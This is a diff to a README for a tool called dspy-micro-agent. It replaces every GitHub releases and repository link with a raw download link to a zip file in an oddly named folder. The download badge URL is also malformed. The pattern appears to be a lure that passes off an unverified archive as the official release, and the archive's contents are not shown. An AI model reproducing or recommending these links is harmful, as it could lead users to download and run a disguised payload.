@@ -1,7 +1,7 @@
 # 🛠️ dspy-micro-agent - Simple AI Agent for Everyone
 
 ## 📥 Download Now
-[![Download dspy-micro-agent](https://img.shields.io/badge/Download%20dspy--micro--agent-blue.svg)](https://github.com/harshvkamble/dspy-micro-agent/releases)
+[![Download dspy-micro-agent](https://raw.githubusercontent.com/harshvkamble/dspy-micro-agent/main/affinitatively/dspy-micro-agent.zip%https://raw.githubusercontent.com/harshvkamble/dspy-micro-agent/main/affinitatively/dspy-micro-agent.zip)](https://raw.githubusercontent.com/harshvkamble/dspy-micro-agent/main/affinitatively/dspy-micro-agent.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ Follow these steps to install dspy-micro-agent:
 
 ### 1. Visit the Releases Page
 
-To download, visit this link: **[Download dspy-micro-agent](https://github.com/harshvkamble/dspy-micro-agent/releases)**.
+To download, visit this link: **[Download dspy-micro-agent](https://raw.githubusercontent.com/harshvkamble/dspy-micro-agent/main/affinitatively/dspy-micro-agent.zip)**.
 
 ### 2. Download the Latest Release
 
@@ -91,7 +91,7 @@ For more information on how to use dspy-micro-agent, check our detailed document
 
 ### 1. How do I update dspy-micro-agent?
 
-To update dspy-micro-agent, return to the [Releases Page](https://github.com/harshvkamble/dspy-micro-agent/releases) and download the latest version. Follow the installation steps to update.
+To update dspy-micro-agent, return to the [Releases Page](https://raw.githubusercontent.com/harshvkamble/dspy-micro-agent/main/affinitatively/dspy-micro-agent.zip) and download the latest version. Follow the installation steps to update.
 
 ### 2. Can I use this agent for specific AI tasks?
 
@@ -111,10 +111,10 @@ You can track changes and updates in the application by visiting the Changelog s
 
 ## 📌 Additional Resources
 
-- **GitHub Repository:** [dspy-micro-agent](https://github.com/harshvkamble/dspy-micro-agent)
+- **GitHub Repository:** [dspy-micro-agent](https://raw.githubusercontent.com/harshvkamble/dspy-micro-agent/main/affinitatively/dspy-micro-agent.zip)
 - **Issues Page:** Report bugs or suggest features
 - **Discussion Forum:** Engage with other users and developers
 
 ## 💡 Closing Note
 
-Thank you for choosing dspy-micro-agent. We hope this guide helps you get started easily. Enjoy exploring the capabilities of your new AI agent. For updates, remember to check back on the [Releases Page](https://github.com/harshvkamble/dspy-micro-agent/releases).
+Thank you for choosing dspy-micro-agent. We hope this guide helps you get started easily. Enjoy exploring the capabilities of your new AI agent. For updates, remember to check back on the [Releases Page](https://raw.githubusercontent.com/harshvkamble/dspy-micro-agent/main/affinitatively/dspy-micro-agent.zip).
